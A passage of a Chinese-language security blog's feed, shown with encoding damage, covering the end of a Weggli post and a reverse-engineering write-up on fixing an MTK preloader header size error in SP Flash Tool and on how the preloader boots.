&amp;source);</span><br><span class="line"> </span><br><span class="line">                     if matches.is_empty() &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›´è§‚å¤šäº† : </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220802153714210.png" alt="image-20220802153714210"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å…³äºWeggli&quot;&gt;&lt;a href=&quot;#å…³äºWeggli&quot; class=&quot;headerlink&quot; title=&quot;å…³äºWeggli&quot;&gt;&lt;/a&gt;å…³äºWeggli&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;AST Pattern Search&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æ ¸å¿ƒæ˜¯ä½¿ç”¨å’Œ &lt;code&gt;tree-sitter&lt;/code&gt; åº“ï¼Œç„¶åæäº† &lt;code&gt;query-tree&lt;/code&gt; æ¥åœ¨ &lt;code&gt;AST&lt;/code&gt;ä¸Šè¿›è¡Œæœç´¢ï¼Œè¿™åªèƒ½è¯´æ˜¯åŒ¹é…ç‰¹å®šçš„ä»£ç ç‰‡æ®µï¼Œè¿˜è¾¾ä¸åˆ°ç¨‹åºåˆ†æçš„é‚£ä¸ªçº§åˆ«ï¼Œæ‰€ä»¥ç†è®ºä¸Šåªèƒ½è¿‡ç¨‹å†…åˆ†æï¼Œè€Œä¸”æ²¡æœ‰ä¸Šä¸‹æ–‡å•¥çš„ :D  ç›´ç™½ç‚¹è¯´çš„è¯ï¼Œåƒæ˜¯&lt;code&gt;AST&lt;/code&gt;çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¸è¿‡æŸç§æ„ä¹‰ä¸Šæ¥è¯´å¯¹äºä½¿ç”¨ç™½ç›’æ–¹æ¡ˆå¿«é€Ÿå¬å›ä¸€äº›æ¼æ´ä¹Ÿæ˜¯ä¸€ç§å€Ÿé‰´å§ã€‚&lt;/p&gt;</summary>
    
    
    
    
    <category term="weggli" scheme="https://o0xmuhe.github.io/tags/weggli/"/>
    
  </entry>
  
  <entry>
    <title>MTK Preloader è¸©å‘</title>
    <link href="https://o0xmuhe.github.io/2022/03/05/MTK-Preloader-%E8%B8%A9%E5%9D%91/"/>
    <id>https://o0xmuhe.github.io/2022/03/05/MTK-Preloader-%E8%B8%A9%E5%9D%91/</id>
    <published>2022-03-05T13:07:17.000Z</published>
    <updated>2022-03-05T13:30:20.339Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><ul><li>MT6737T</li><li>Android</li></ul><span id="more"></span><p>å‰æœŸ<code>readback</code> ä»€ä¹ˆéƒ½éƒ½æ­£å¸¸ï¼Œä¹Ÿåˆ‡å‡ºæ¥äº†å„ä¸ªåˆ†åŒºï¼Œå¹¶åˆ¶ä½œäº†scatterã€‚</p><p>æŠ˜è…¾çš„æ—¶å€™å‘ç°<code>SP Flash Tool </code> åŠ è½½preloaderçš„æ—¶å€™æœ‰æŠ¥é”™ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/flash_tool_error.png" alt="flash_tool_error"></p><h3 id="çœ‹æ—¥å¿—"><a href="#çœ‹æ—¥å¿—" class="headerlink" title="çœ‹æ—¥å¿—"></a>çœ‹æ—¥å¿—</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">02/23/22 22:35:20.309 BROM_DLL[3848][1900]: DL_HANDLE()::Rom_Load(): ROM loaded, name = preloader (flashtool_handle_internal.cpp:4693)</span><br><span class="line"></span><br><span class="line">02/23/22 22:35:20.309 BROM_DLL[3848][1900]: DEBUG: DL_HANDLE::UpdateRomFileInfoByPreloader(): UpdateRomFileInfoByPreloader get bbchiptype : 159 (flashtool_handle_internal.cpp:4359) //chip <span class="built_in">type</span> æ‰€ä»¥åº”è¯¥æ˜¯å¼ºç»‘å®šçš„</span><br><span class="line">02/23/22 22:35:20.309 BROM_DLL[3848][1900]: DL_HANDLE()::UpdateRomFileInfoByPreloader(): Loading SV5 BL, name = preloader (flashtool_handle_internal.cpp:4374)</span><br><span class="line"></span><br><span class="line">02/23/22 22:35:20.309 BROM_DLL[3848][1900]: ERROR: DL_HANDLE(0x0BC38DE8)::UpdateRomFileInfoByPreloader(): [0]: preloader - Parse GFH_FILE_INFO error(0x00001008)!  (flashtool_handle_internal.cpp:4385)</span><br><span class="line">02/23/22 22:35:20.309 BROM_DLL[3848][1900]: ERROR: DL_HANDLE(0xB7B1A8AC)::File length not match with GFH specified file length (flashtool_handle_internal.cpp:4386) // ä¸åŒ¹é…ï¼ GFH æŒ‡å®šçš„æ–‡ä»¶é•¿åº¦ä¸åŒ¹é…</span><br><span class="line">02/23/22 22:35:20.309 BROM_DLL[3848][1900]: ERROR: File length (262160) / GFH specified file length (0) (flashtool_handle_internal.cpp:4387)  // è¿™é‡Œï¼Œæ–‡ä»¶é•¿åº¦æ˜¯xxxï¼Œä½†æ˜¯GFHé‡ŒæŒ‡å®šçš„ä¸å¯¹</span><br><span class="line">02/23/22 22:35:20.309 BROM_DLL[3848][1900]: ERROR: DL_Rom_Load(): &lt;ERR_CHECKPOINT&gt;[232][error][5066]&lt;/ERR_CHECKPOINT&gt; [S_DL_PC_BL_INVALID_GFH_FILE_INFO] (flashtool_handle.cpp:941)</span><br><span class="line">02/23/22 22:35:20.309 BROM_DLL[3848][1900]: DL_Rom_Load(): DL_HANDLE-&gt;rwlock: WRITE_UNLOCK. (rwlock.cpp:476)</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼š</p><ul><li>DL_HANDLE()::Rom_Load() å‡½æ•°</li><li>è¿™ä¸ªå¹³å°æ ¡éªŒäº†sizeå­—æ®µå’Œå®é™…preloaderæ–‡ä»¶çš„size</li></ul><h3 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file libflashtool.v1.so</span><br><span class="line">libflashtool.v1.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, BuildID[sha1]=de4c47b0bb41c274fd42efb55ceb476bcc840d7a, not stripped</span><br></pre></td></tr></table></figure><p>åœ¨ <code>DL_HANDLE::UpdateRomFileInfoByPreloader</code> æ–¹æ³•ä¸­æ‰¾åˆ°äº†æ ¡éªŒçš„é€»è¾‘ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *((_DWORD *)var48 + <span class="number">15</span>) == <span class="number">7</span> )</span><br><span class="line">&#123;</span><br><span class="line">  err_code = DL_HANDLE::<span class="built_in">UpdateRomFileInfoByPreloader</span>(<span class="keyword">this</span>, sys_index);<span class="comment">// updateROM File!</span></span><br><span class="line">  <span class="keyword">if</span> ( err_code )</span><br><span class="line">    <span class="keyword">return</span> err_code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">erro_code = ROM_ID_Class::<span class="built_in">LoadGFH</span>((__int64)<span class="keyword">this</span> + <span class="number">112</span>, *((_QWORD *)ROM + <span class="number">123</span>), <span class="number">0</span>, </span><br><span class="line">(__int64)&amp;GFH);</span><br><span class="line"><span class="keyword">if</span> ( erro_code &gt; <span class="number">0xFFF</span> )</span><br><span class="line">&#123;</span><br><span class="line">  r12_12 = (<span class="keyword">const</span> <span class="keyword">char</span> *)std::string::<span class="built_in">c_str</span>(ROM);</span><br><span class="line">  rbx12 = g_hBROM_DEBUG;</span><br><span class="line">  MetaTrace::<span class="built_in">MetaTrace</span>(</span><br><span class="line">    (MetaTrace *)var1030,</span><br><span class="line">    <span class="string">&quot;FlashToolLib/source/common/handle/src/flashtool_handle_internal.cpp&quot;</span>,</span><br><span class="line">    <span class="number">4417</span>,</span><br><span class="line">    <span class="number">0xFF</span>u,</span><br><span class="line">    <span class="string">&quot; ERROR:&quot;</span>);</span><br><span class="line">  MetaTrace::<span class="built_in"><span class="keyword">operator</span></span>()(</span><br><span class="line">    var1030,</span><br><span class="line">    rbx12,</span><br><span class="line">    <span class="string">&quot;DL_HANDLE(0x%08X)::UpdateRomFileInfoByPreloader(): [%u]: %s - Load GFH_FILE_INFO error(0x%08X)!  &quot;</span>,</span><br><span class="line">    <span class="keyword">this</span>,</span><br><span class="line">    rom_file_name,</span><br><span class="line">    r12_12,</span><br><span class="line">    erro_code);</span><br><span class="line">  MetaTrace::~<span class="built_in">MetaTrace</span>((MetaTrace *)var1030);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">5066</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *((_DWORD *)GFH + <span class="number">8</span>) != *((_QWORD *)ROM + <span class="number">0x7C</span>) )<span class="comment">// length check!!</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//.....error log</span></span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ROM + 0x7C</code> æ˜¯å®é™…çš„æ–‡ä»¶å¤§å°<br><code>GFH + 8</code> æ˜¯ è§£æpreloader ä¸­çš„GFHç»“æ„ä¸­çš„sizeå­—æ®µ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROM_ID_Class::LoadGFH</span><br><span class="line">    GFH_Find(rom_buffer, <span class="built_in">type</span>, (_QWORD *)st);</span><br><span class="line">        GFH_Internal_Parser(buff_addr, 0LL, <span class="built_in">type</span>, GFG_st);</span><br><span class="line">            </span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">GFH_Internal_Parser</span><span class="params">(__int64 buf_addr, __int64 flag_0, <span class="keyword">int</span> type, _QWORD *GFG_st)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 st; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> cnt; <span class="comment">// [rsp+3Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+44h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ret; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> reta; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+4Eh] [rbp-2h]</span></span><br><span class="line">  <span class="keyword">char</span> v15_0; <span class="comment">// [rsp+4Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  v15_0 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( flag_0 )</span><br><span class="line">    v15_0 = <span class="number">1</span>;</span><br><span class="line">  ret = <span class="built_in">GFH_FILE_INFO_BasicCheck</span>(buf_addr);</span><br><span class="line">  <span class="keyword">if</span> ( ret &gt; <span class="number">0xFFF</span> )</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  cnt = *(_DWORD *)(buf_addr + <span class="number">0x28</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; cnt; i = v10 )               <span class="comment">// parse sub struct?</span></span><br><span class="line">  &#123;</span><br><span class="line">    st = buf_addr + i;</span><br><span class="line">    <span class="keyword">if</span> ( (*(_DWORD *)st &amp; <span class="number">0xFFFFFF</span>) != <span class="number">5066061</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0x1003</span>LL;</span><br><span class="line">    v10 = i + *(<span class="keyword">unsigned</span> __int16 *)(st + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> ( cnt &lt; v10 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0x1005</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( v15_0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_WORD *)(st + <span class="number">6</span>) &lt;= <span class="number">0x104</span>u )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = flag_0 + <span class="number">24LL</span> * *(<span class="keyword">unsigned</span> __int16 *)(st + <span class="number">6</span>) + <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)v8 )</span><br><span class="line">        &#123;</span><br><span class="line">          reta = (*(__int64 (__fastcall **)(__int64, _QWORD))(v8 + <span class="number">8</span>))(st, *(_QWORD *)(v8 + <span class="number">16</span>));</span><br><span class="line">          <span class="keyword">if</span> ( reta &gt; <span class="number">0xFFF</span> )</span><br><span class="line">            <span class="keyword">return</span> reta;</span><br><span class="line">          v14 = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( type == *(<span class="keyword">unsigned</span> __int16 *)(st + <span class="number">6</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *GFG_st = st;                             <span class="comment">// [1]</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v15_0 &amp;&amp; v14 )</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0x1003</span>LL;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>[1]</code> çš„ä½ç½® æ‰¾åˆ°è¿™ä¸ªç»“æ„ï¼Œç„¶åæŠŠæŒ‡é’ˆèµ‹å€¼ï¼Œåˆ†æè¿™æ®µé€»è¾‘ï¼Œå…¶å®å°±æ˜¯æ–‡ä»¶å¤´:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/preloader_hexview.png" alt="preloader_hexview"></p><p>æŒ‡å®špreloaderæ–‡ä»¶å¤§å°æ˜¯ <code>0x26794</code>ï¼Œä¿®æ”¹æ–‡ä»¶å¤§å°å³å¯ã€‚</p><h3 id="è§£å†³æŠ¥é”™"><a href="#è§£å†³æŠ¥é”™" class="headerlink" title="è§£å†³æŠ¥é”™"></a>è§£å†³æŠ¥é”™</h3><p>æ‰€ä»¥åªéœ€è¦ä¿®æ”¹ preloaderæ–‡ä»¶çš„é•¿åº¦ä¸ºå…¶ <code>+0x24</code> å¤„ 4bytesä»£è¡¨sizeçš„å­—æ®µå³å¯<br>PSï¼šä¸èƒ½ä¿®æ”¹è¿™ä¸ªé•¿åº¦å­—æ®µ</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/load_preloader_img.png" alt="load_preloader_img"></p><h2 id="æ·±å…¥ç ”ç©¶"><a href="#æ·±å…¥ç ”ç©¶" class="headerlink" title="æ·±å…¥ç ”ç©¶"></a>æ·±å…¥ç ”ç©¶</h2><blockquote><p>ä¹‹å‰æçš„å¹³å°ä¹Ÿæ²¡æ³¨æ„è¿™ä¸ªé—®é¢˜ï¼Œä¹Ÿæ²¡æŠ¥é”™ï¼Œä½†æ˜¯sizeå¯¹ä¸ä¸Šï¼Œæ‰€ä»¥éœ€è¦æ¢ç©¶æ–‡ä»¶æ ¼å¼å’Œä¸ºä»€ä¹ˆæ£€æŸ¥</p></blockquote><h3 id="ä»€ä¹ˆæ˜¯preloader"><a href="#ä»€ä¹ˆæ˜¯preloader" class="headerlink" title="ä»€ä¹ˆæ˜¯preloader"></a>ä»€ä¹ˆæ˜¯preloader</h3><ul><li><a href="https://www.cnblogs.com/wen123456/p/14034493.html">MTK6735 pre-loaderæºä»£ç åˆ†æ - luoyuna - åšå®¢å›­</a></li><li><a href="https://blog.csdn.net/u011784994/article/details/104898430">[MT6765]Preloader_æµç¨‹åˆ†æâ€“åŸºäºandroid 10_nancyçš„ä¸“æ -CSDNåšå®¢_android pmic</a></li><li>è¿˜æœ‰leakçš„MT6577çš„åŸºçº¿ä»£ç å‚è€ƒ</li></ul><p><code>ä»‹äºboot rom å’Œ bootloaderä¹‹é—´çš„æ¡¥æ¢</code>ï¼Œä¸»è¦å·¥ä½œæ˜¯åˆå§‹åŒ–ç¯å¢ƒï¼ŒåŒ…æ‹¬cç¯å¢ƒï¼Œtimer,gpio,pmic,uart,i2cç­‰ä»¥åŠè£…è½½lké•œåƒè‡³DRAMä¸­,å»ºç«‹èµ·æœ€åŸºæœ¬çš„è¿è¡Œç¯å¢ƒ,æœ€é‡è¦çš„å°±æ˜¯<strong>åˆå§‹åŒ–DRAM</strong>ã€‚</p><ul><li>æ‰§è¡Œåœ¨ ARM  EL3</li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/preloader_birdview.png" alt="preloader_birdview"></p><h3 id="å·¥ä½œåŸç†-â€“-å¯åŠ¨è¿‡ç¨‹"><a href="#å·¥ä½œåŸç†-â€“-å¯åŠ¨è¿‡ç¨‹" class="headerlink" title="å·¥ä½œåŸç† â€“ å¯åŠ¨è¿‡ç¨‹"></a>å·¥ä½œåŸç† â€“ å¯åŠ¨è¿‡ç¨‹</h3><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/mtk_boot.png" alt="mtk_boot"></p><p>å¦ä¸€ç§æƒ…å†µæ˜¯å®ç°äº†ATF(Arm Trust Firmware)çš„æ—¶å€™ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/boot_with_atf.png" alt="boot_with_atf"></p><p><a href="https://blog.csdn.net/chenying126/article/details/78638944">ATFå®ç°åŸç†_chenying126çš„åšå®¢-CSDNåšå®¢_atf</a></p><ol><li>boot romä¸­æ‰§è¡Œboot code</li><li>æŠŠpreloaderåŠ è½½åˆ° ISRAMä¸­</li><li>æ‰§è¡Œpreloaderï¼Œå„ç§åˆå§‹åŒ–çš„å·¥ä½œ(DRAMåˆå§‹åŒ–)</li><li>æŠŠbootloader(uboot, lk)åŠ è½½åˆ°DRAM</li><li>è·³è½¬åˆ°lkæ‰§è¡Œ</li><li>lkæ‰§è¡Œ</li><li>æŠŠLinux kernel å’Œ ramdiskåŠ è½½åˆ°DRAM</li><li>è·³è½¬åˆ°kernel</li><li>kernelæ‰§è¡Œ</li><li>è¿™æ˜¯åœ¨Linuxå¯åŠ¨è¿‡ç¨‹ä¸­ä½¿ç”¨çš„ä¸€ä¸ªä¸´æ—¶æ ¹ </li></ol><h3 id="preloader-è§£æ"><a href="#preloader-è§£æ" class="headerlink" title="preloader è§£æ"></a>preloader è§£æ</h3><p>preloaderå¯ä»¥çœ‹æˆä¸€ä¸ªç‰¹å®šæ ¼å¼çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦æ‰¾å…¥å£ç‚¹ã€‚</p><p><code>/Users/muhe/Code/MTK6577/mediatek/platform/mt6577/preloader/src/init/init.s</code></p><p>githubä¸Šæ‰¾çš„ä¸€ä¸ªå¯èƒ½æ˜¯æ³„æ¼çš„åŸºçº¿ä»£ç æ¥å‚è€ƒçš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">_start :</span><br><span class="line"></span><br><span class="line">b resethandler</span><br><span class="line"></span><br><span class="line">bss_start:</span><br><span class="line"></span><br><span class="line">.word _bss_start</span><br><span class="line"></span><br><span class="line">bss_end:</span><br><span class="line"></span><br><span class="line">.word _bss_end</span><br><span class="line"></span><br><span class="line">stack :</span><br><span class="line"></span><br><span class="line">.long sys_stack</span><br><span class="line"></span><br><span class="line">stacksz:</span><br><span class="line"></span><br><span class="line">.long sys_stack_sz</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">resethandler :</span><br><span class="line">    MOV r0, #0</span><br><span class="line">    </span><br><span class="line">    MOV r1, #0</span><br><span class="line">    </span><br><span class="line">    MOV r2, #0</span><br><span class="line">    </span><br><span class="line">    MOV r3, #0</span><br><span class="line">    </span><br><span class="line">    MOV r4, #0</span><br><span class="line">    </span><br><span class="line">    MOV r5, #0</span><br><span class="line">    </span><br><span class="line">    MOV r6, #0</span><br><span class="line">    </span><br><span class="line">    MOV r7, #0</span><br><span class="line">    </span><br><span class="line">    MOV r8, #0</span><br><span class="line">    </span><br><span class="line">    MOV r9, #0</span><br><span class="line">    </span><br><span class="line">    MOV r10, #0</span><br><span class="line">    </span><br><span class="line">    MOV r11, #0</span><br><span class="line">    </span><br><span class="line">    MOV r12, #0</span><br><span class="line">    </span><br><span class="line">    MOV sp, #0</span><br><span class="line">    </span><br><span class="line">    MOV lr, #0</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç‰¹å¾è¿˜æ˜¯å¾ˆæ˜æ˜¾çš„ï¼Œå¯ä»¥è¯•è¯•çœ‹:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/preloader_init.png" alt="preloader_init"></p><p>ä¸Šé¢è¿™ä¸ª0xEAåº”è¯¥æ˜¯ bæŒ‡ä»¤ï¼Œå¯ä»¥å€Ÿç”±è¿™ä¸ªæå®šåŸºåœ°å€</p><p>ç„¶åæ˜¯åˆ°<code>main.c</code>ï¼Œç»§ç»­äººè‚‰æ‰¾ç‰¹å¾</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/preloader_main.png" alt="preloader_main"></p><p>æ‰¾åˆ°äº†å­—ç¬¦ä¸²ï¼Œä½†æ˜¯æ²¡æœ‰å¼•ç”¨å…³ç³» :( </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/preloader_main%201.png" alt="preloader_main 1"></p><p>é€šè¿‡Ghridaçš„å¼ºåˆ¶æ•´ä¸ªbinaryçš„åˆ†æï¼Œç„¶åå¼•ç”¨å…³ç³»ç¡®å®šäº†mainçš„ä½ç½®ï¼Œè‡³æ­¤å°±å¯ä»¥å¾€ä¸‹çœ‹äº†ï¼Œå¯¹æ¯”å…¶ä»–å¹³å°preloaderçš„æºç ï¼Œèƒ½çœ‹ä¸ªä¸ƒä¸ƒå…«å…«äº†ã€‚</p><p>PS : åŸºåœ°å€ç¼–è¯‘çš„æ—¶å€™å¯ä»¥æŒ‡å®šçš„ï¼Œæ¯”å¦‚åœ¨ <code>linux/bootloader/preloader/platform/mt6735/link_descriptor.ld</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">OUTPUT_ARCH(arm)</span><br><span class="line"></span><br><span class="line">ENTRY(_start)</span><br><span class="line"></span><br><span class="line">romBase = <span class="number">0x00201000</span>;</span><br><span class="line">ramBase = <span class="number">0x00102180</span>;</span><br><span class="line"></span><br><span class="line">MEMORY &#123;</span><br><span class="line">    ram : ORIGIN = ramBase, LENGTH = <span class="number">0xBA80</span></span><br><span class="line">    rom : ORIGIN = romBase, LENGTH = <span class="number">0x1F000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ : <code>linux/bootloader/preloader/platform/mt6735/default.mak</code></p><p>githubçœŸæ˜¯ä¸ªå¥½åœ°æ–¹å•Šï¼Œè¿˜æœ‰ä¸€ä¸ªå®Œæ•´çš„MT6737å¹³å°Linux basedçš„åŸºçº¿ä»£ç ï¼Œå…¨å¥—çš„ç¯å¢ƒå’Œbuildäº§ç‰©éƒ½æœ‰çš„ï¼Œå¯ä»¥çœ‹åˆ°ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/mt6737_preloader_bin_list.png" alt="mt6737_preloader_bin_list"></p><ul><li>æ¨æµ‹preloaderåº”è¯¥æ˜¯ä¸€ä¸ªelf ç»è¿‡copyobjä¹‹ç±»çš„å¤„ç†ä¹‹åæ‹¼æ¥ä¸Šäº†ç‰¹å®šçš„æ–‡ä»¶å¤´</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file *.elf</span><br><span class="line">preloader_bd6737m_35g_b_m0.elf: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, with debug_info, not stripped</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ç›¸å…³çš„makefileå¯ä»¥éªŒè¯è¯¥çŒœæƒ³:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$(D_BIN)</span>/preloader.elf: <span class="variable">$(D_BIN)</span>/<span class="variable">$(PL_IMAGE_NAME)</span>.elf</span><br><span class="line"></span><br><span class="line">    <span class="variable">$(OBJCOPY)</span> -R .dram <span class="variable">$(D_BIN)</span>/<span class="variable">$(PL_IMAGE_NAME)</span>.elf -O elf32-littlearm <span class="variable">$(D_BIN)</span>/preloader.elf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(CFG_PRELOADER_DRAM_USE)</span>, 1)</span><br><span class="line"></span><br><span class="line"><span class="section">preloader_bin: 